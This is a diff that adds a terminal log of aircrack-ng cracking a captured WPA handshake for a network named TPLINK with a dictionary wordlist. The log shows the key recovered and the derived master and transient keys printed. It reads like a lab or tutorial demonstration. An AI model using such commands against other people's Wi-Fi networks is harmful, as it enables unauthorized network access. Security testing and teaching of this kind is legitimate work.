@@ -1,0 +1,31 @@
+masha@masha-pc:~$ sudo aircrack-ng WPAcrack-01.cap -w /usr/share/dict/cracklib-small 
+Opening WPAcrack-01.cap
+Read 263182 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  C0:4A:00:63:B5:CC  TPLINK                    WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening WPAcrack-01.cap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.2 beta3
+
+
+                   [00:00:00] 8 keys tested (223.13 k/s)
+
+
+                           KEY FOUND! [ 12345678 ]
+
+
+      Master Key     : 99 21 94 D7 A6 15 80 09 BF A2 57 73 10 82 91 64 
+                       2F 28 A0 C3 2A 31 AB 25 56 A1 5D EE 97 EF 0D BB 
+
+      Transient Key  : E6 4D 43 E3 44 76 6A 55 5E FB CB A9 2A EA B7 DE 
+                       11 C4 CB 17 8E 04 06 73 4D 48 3E 22 62 69 B4 39 
+                       7C 21 F4 CA A3 66 8E 62 B1 30 E8 2A 2D F1 62 52 
+                       ED A7 D7 C1 2E C7 27 96 60 C1 2E 1F 59 F4 56 73 
+
+      EAPOL HMAC     : 6B E2 16 A4 1D 34 C2 39 91 8F F0 7D 99 2D 7E 65 
